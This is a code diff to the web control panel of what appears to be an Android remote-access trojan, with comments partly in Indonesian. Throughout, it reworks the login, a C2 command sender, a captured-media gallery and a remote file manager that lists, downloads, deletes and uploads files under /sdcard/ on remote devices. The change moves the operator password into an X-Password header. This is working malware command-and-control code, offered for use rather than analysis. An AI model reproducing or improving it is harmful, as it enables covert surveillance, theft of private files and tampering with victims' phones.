@@ -437,7 +437,7 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <!-- ============================================================
-     MAIN SCRIPT - FULL INTEGRATION
+     MAIN SCRIPT - FULL INTEGRATION (PERBAIKAN HEADER X-Password)
      ============================================================ -->
 <script>
 // ============================================================
@@ -562,12 +562,14 @@ var C2_COMMANDS = {
 };
 
 // ============================================================
-// LOGIN
+// LOGIN - PERBAIKAN HEADER X-Password
 // ============================================================
 function login(){
     var p = document.getElementById('loginPassword').value.trim();
     if(!p){ showLoginError('Enter master key!'); return; }
-    fetch('/data?key='+p).then(r=>{
+    fetch('/data', {
+        headers: { 'X-Password': p }
+    }).then(r=>{
         if(r.status===200){
             PASSWORD = p;
             document.getElementById('loginContainer').style.display = 'none';
@@ -661,10 +663,12 @@ function connectWebSocket(){
 }
 
 // ============================================================
-// DATA - INTEGRATED WITH ALL SOURCES
+// DATA - PERBAIKAN HEADER X-Password
 // ============================================================
 function refreshData(){
-    fetch('/data?key='+PASSWORD).then(r=>r.json()).then(data=>{
+    fetch('/data', {
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
         if(data && data.data){
             allData = data.data;
             renderData(allData);
@@ -906,9 +910,9 @@ function sendC2Command(cmd, param){
         if(param.includes('|')){ var parts=param.split('|'); data.param1=parts[0]||''; data.param2=parts[1]||''; }
         else data.param = param;
     }
-    fetch('/c2?key='+PASSWORD, {
+    fetch('/c2', {
         method:'POST',
-        headers:{'Content-Type':'application/json'},
+        headers:{'Content-Type':'application/json', 'X-Password': PASSWORD},
         body:JSON.stringify(data)
     }).then(r=>r.json()).then(d=>{
         addLog('c2', '✅ Command sent: '+cmd+' - '+(d.status||'ok'));
@@ -957,12 +961,14 @@ function filterLogs(){ renderLogs(); }
 function clearLogs(){ logEntries=[]; renderLogs(); }
 
 // ============================================================
-// MEDIA
+// MEDIA - PERBAIKAN HEADER X-Password
 // ============================================================
 function renderMedia(){
     var g = document.getElementById('mediaGallery');
     g.innerHTML = '<div class="empty-state">⏳ Loading media...</div>';
-    fetch('/data?key='+PASSWORD+'&limit=300').then(r=>r.json()).then(data=>{
+    fetch('/data?limit=300', {
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
         g.innerHTML = '';
         if(!data || !data.data || !data.data.length){
             g.innerHTML = '<div class="empty-state">📭 No media data</div>';
@@ -1027,46 +1033,47 @@ function downloadMedia(dataUrl, filename){
 }
 
 // ============================================================
-// FILES
+// FILES - PERBAIKAN HEADER X-Password
 // ============================================================
 function renderFiles(path){
     currentFilePath = path || '/sdcard/';
     var container = document.getElementById('fileList');
     container.innerHTML = '<div class="empty-state">⏳ Loading...</div>';
-    fetch('/data?key='+PASSWORD+'&type=list_file&path='+encodeURIComponent(currentFilePath))
-        .then(r=>r.json()).then(data=>{
-            container.innerHTML = '';
-            var bc = document.createElement('div');
-            bc.className = 'file-breadcrumb';
-            bc.innerHTML = '<span>📁</span>';
-            var parts = currentFilePath.replace(/^\/+/,'').split('/');
-            var cp = '';
-            parts.forEach((p,i)=>{ if(p){ cp+=p+'/'; bc.innerHTML+='<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i<parts.length-1)bc.innerHTML+='<span style="color:#8899aa;">/</span>'; }});
-            if(!currentFilePath || currentFilePath==='/sdcard/') bc.innerHTML+='<span style="color:#8899aa;">/sdcard/</span>';
-            container.appendChild(bc);
-            var list = document.createElement('div');
-            if(data && data.files && data.files.length){
-                var files = data.files;
-                files.sort((a,b)=>{ if(a.isFolder&&!b.isFolder)return -1; if(!a.isFolder&&b.isFolder)return 1; return (a.name||'').localeCompare(b.name||''); });
-                files.forEach(f=>{
-                    var item = document.createElement('div');
-                    item.className = 'file-item';
-                    var icon = f.isFolder?'📁':'📄';
-                    var size = f.isFolder?'--':formatSize(f.size||0);
-                    var fullPath = f.path || (currentFilePath+(f.name||''));
-                    if(f.isFolder) item.onclick = function(){ renderFiles(fullPath+'/'); };
-                    else item.onclick = function(){ openFileModal(fullPath); };
-                    item.innerHTML = '<div>'+icon+' '+(f.name||'')+'</div>'+
-                                    '<div style="display:flex;align-items:center;gap:8px">'+
-                                    '<span style="color:#8899aa;font-size:9px">'+size+'</span>'+
-                                    '<div class="actions">'+
-                                    '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\''+fullPath+'\')">📥</button>'+
-                                    '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\''+fullPath+'\')">🗑️</button></div></div>';
-                    list.appendChild(item);
-                });
-            } else { list.innerHTML = '<div class="empty-state">📭 Empty folder</div>'; }
-            container.appendChild(list);
-        }).catch(e=>{ container.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+    fetch('/data?type=list_file&path='+encodeURIComponent(currentFilePath), {
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
+        container.innerHTML = '';
+        var bc = document.createElement('div');
+        bc.className = 'file-breadcrumb';
+        bc.innerHTML = '<span>📁</span>';
+        var parts = currentFilePath.replace(/^\/+/,'').split('/');
+        var cp = '';
+        parts.forEach((p,i)=>{ if(p){ cp+=p+'/'; bc.innerHTML+='<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i<parts.length-1)bc.innerHTML+='<span style="color:#8899aa;">/</span>'; }});
+        if(!currentFilePath || currentFilePath==='/sdcard/') bc.innerHTML+='<span style="color:#8899aa;">/sdcard/</span>';
+        container.appendChild(bc);
+        var list = document.createElement('div');
+        if(data && data.files && data.files.length){
+            var files = data.files;
+            files.sort((a,b)=>{ if(a.isFolder&&!b.isFolder)return -1; if(!a.isFolder&&b.isFolder)return 1; return (a.name||'').localeCompare(b.name||''); });
+            files.forEach(f=>{
+                var item = document.createElement('div');
+                item.className = 'file-item';
+                var icon = f.isFolder?'📁':'📄';
+                var size = f.isFolder?'--':formatSize(f.size||0);
+                var fullPath = f.path || (currentFilePath+(f.name||''));
+                if(f.isFolder) item.onclick = function(){ renderFiles(fullPath+'/'); };
+                else item.onclick = function(){ openFileModal(fullPath); };
+                item.innerHTML = '<div>'+icon+' '+(f.name||'')+'</div>'+
+                                '<div style="display:flex;align-items:center;gap:8px">'+
+                                '<span style="color:#8899aa;font-size:9px">'+size+'</span>'+
+                                '<div class="actions">'+
+                                '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\''+fullPath+'\')">📥</button>'+
+                                '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\''+fullPath+'\')">🗑️</button></div></div>';
+                list.appendChild(item);
+            });
+        } else { list.innerHTML = '<div class="empty-state">📭 Empty folder</div>'; }
+        container.appendChild(list);
+    }).catch(e=>{ container.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
 
 function formatSize(bytes){
@@ -1082,50 +1089,54 @@ function openFileModal(path){
                '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>'+
                '<div style="text-align:center;padding:15px;color:#8899aa;">⏳ Loading...</div>';
     openModal(html);
-    fetch('/data?key='+PASSWORD+'&type=ambil_file&path='+encodeURIComponent(path))
-        .then(r=>r.json()).then(data=>{
-            var body = document.getElementById('modalBody');
-            if(data && data.content){
-                var content = data.content;
-                var isImg = content.startsWith('data:image');
-                var isText = !isImg && content.length<50000;
-                var html2 = '<h3 style="color:#4fc3f7;margin-bottom:6px">📄 '+path.split('/').pop()+'</h3>'+
-                           '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>';
-                if(isImg) html2 += '<img src="'+content+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
-                else if(isText) html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:10px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
-                else html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file ('+content.length+' chars)</div>';
-                html2 += '<div style="margin-top:10px;display:flex;gap:6px">'+
-                        '<button onclick="downloadFileDirect(\''+path+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
-                        '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
-                body.innerHTML = html2;
-            } else { body.innerHTML = '<div class="empty-state">❌ Failed to load file</div>'; }
-        }).catch(e=>{ document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+    fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
+        var body = document.getElementById('modalBody');
+        if(data && data.content){
+            var content = data.content;
+            var isImg = content.startsWith('data:image');
+            var isText = !isImg && content.length<50000;
+            var html2 = '<h3 style="color:#4fc3f7;margin-bottom:6px">📄 '+path.split('/').pop()+'</h3>'+
+                       '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>';
+            if(isImg) html2 += '<img src="'+content+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
+            else if(isText) html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:10px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
+            else html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file ('+content.length+' chars)</div>';
+            html2 += '<div style="margin-top:10px;display:flex;gap:6px">'+
+                    '<button onclick="downloadFileDirect(\''+path+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
+                    '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
+            body.innerHTML = html2;
+        } else { body.innerHTML = '<div class="empty-state">❌ Failed to load file</div>'; }
+    }).catch(e=>{ document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
 
 function downloadFile(path){
-    fetch('/data?key='+PASSWORD+'&type=ambil_file&path='+encodeURIComponent(path))
-        .then(r=>r.json()).then(data=>{
-            if(data && data.content){
-                var link = document.createElement('a');
-                link.href = data.content;
-                link.download = path.split('/').pop();
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                addLog('info','📥 Downloaded: '+path);
-            }
-        }).catch(e=>alert('Download failed: '+e.message));
+    fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
+        if(data && data.content){
+            var link = document.createElement('a');
+            link.href = data.content;
+            link.download = path.split('/').pop();
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            addLog('info','📥 Downloaded: '+path);
+        }
+    }).catch(e=>alert('Download failed: '+e.message));
 }
 
 function downloadFileDirect(path){ downloadFile(path); closeModal(); }
 
 function deleteFile(path){
     if(!confirm('Delete '+path+'?')) return;
-    fetch('/data?key='+PASSWORD+'&type=hapus_file&path='+encodeURIComponent(path), {method:'DELETE'})
-        .then(r=>r.json()).then(data=>{
-            if(data && data.success){ addLog('info','🗑️ Deleted: '+path); renderFiles(currentFilePath); }
-            else alert('Delete failed');
-        }).catch(e=>alert('Error: '+e.message));
+    fetch('/data?type=hapus_file&path='+encodeURIComponent(path), {
+        method: 'DELETE',
+        headers: { 'X-Password': PASSWORD }
+    }).then(r=>r.json()).then(data=>{
+        if(data && data.success){ addLog('info','🗑️ Deleted: '+path); renderFiles(currentFilePath); }
+        else alert('Delete failed');
+    }).catch(e=>alert('Error: '+e.message));
 }
 
 function uploadFile(){
@@ -1139,10 +1150,10 @@ function uploadFile(){
             var data = ev.target.result;
             var path = prompt('Destination path (e.g. /sdcard/Download/)', '/sdcard/Download/');
             if(!path) return;
-            fetch('/data?key='+PASSWORD+'&type=upload_file&path='+encodeURIComponent(path+file.name), {
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({data:data, name:file.name})
+            fetch('/data?type=upload_file&path='+encodeURIComponent(path+file.name), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Password': PASSWORD },
+                body: JSON.stringify({data: data, name: file.name})
             }).then(r=>r.json()).then(d=>{
                 if(d && d.success){ addLog('info','📤 Uploaded: '+file.name); renderFiles(currentFilePath); }
                 else alert('Upload failed');
